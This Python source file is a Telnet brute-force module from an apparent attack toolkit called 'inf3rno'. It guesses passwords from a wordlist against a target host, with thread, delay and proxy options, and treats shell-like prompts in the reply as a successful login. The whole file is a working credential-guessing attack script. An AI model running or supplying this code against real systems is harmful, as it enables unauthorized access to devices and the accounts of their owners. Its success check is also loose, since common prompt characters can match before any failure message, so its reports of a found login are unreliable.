"""Telnet brute-force module."""

import socket
import time
from inf3rno.core.bruteforce import BaseBrute


class TelnetBrute(BaseBrute):
    """Telnet brute-force implementation."""

    def __init__(self, target: str, port: int = 23, username: str = "admin",
                 wordlist: str = "wordlists/passwords.txt", threads: int = 5,
                 output_file: str = None, verbose: bool = False,
                 delay: float = 0.0, proxy: str = None):
        super().__init__(target, port, username, wordlist, threads, output_file, verbose, delay, proxy)
        self.service = "Telnet"

    def try_login(self, username: str, password: str) -> bool:
        """Attempt Telnet login."""
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target, self.port))

            # Receive banner
            banner = sock.recv(1024).decode("utf-8", errors="ignore")

            # Look for login prompt
            login_prompts = ["login:", "username:", "user:"]
            password_prompts = ["password:", "passwd:"]

            found_login = False
            for prompt in login_prompts:
                if prompt.lower() in banner.lower():
                    found_login = True
                    break

            if not found_login:
                # Wait a bit more for prompt
                time.sleep(1)
                banner += sock.recv(1024).decode("utf-8", errors="ignore")

            # Send username
            sock.send((username + "\n").encode())
            time.sleep(0.5)

            # Wait for password prompt
            response = sock.recv(1024).decode("utf-8", errors="ignore")
            found_password = False
            for prompt in password_prompts:
                if prompt.lower() in response.lower():
                    found_password = True
                    break

            if not found_password:
                time.sleep(0.5)
                response += sock.recv(1024).decode("utf-8", errors="ignore")

            # Send password
            sock.send((password + "\n").encode())
            time.sleep(1)

            # Check response
            response = sock.recv(4096).decode("utf-8", errors="ignore")

            # Check for success indicators
            success_indicators = ["$", "#", "~", ">", "shell", "last login"]
            failure_indicators = ["incorrect", "failed", "denied", "sorry", "error"]

            response_lower = response.lower()

            for indicator in success_indicators:
                if indicator in response_lower:
                    return True

            for indicator in failure_indicators:
                if indicator in response_lower:
                    return False

            # If we got a prompt, it might be success
            if response and len(response) > 0:
                # Try to execute a command
                sock.send(("echo test_success\n").encode())
                time.sleep(0.5)
                test_response = sock.recv(4096).decode("utf-8", errors="ignore")
                if "test_success" in test_response:
                    return True

            return False

        except ConnectionRefusedError:
            if self.verbose:
                print(f"[!] Telnet connection refused")
            return False
        except socket.timeout:
            if self.verbose:
                print(f"[!] Telnet timeout for {username}:{password}")
            return False
        except Exception as e:
            if self.verbose:
                print(f"[!] Telnet error for {username}:{password}: {e}")
            return False
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
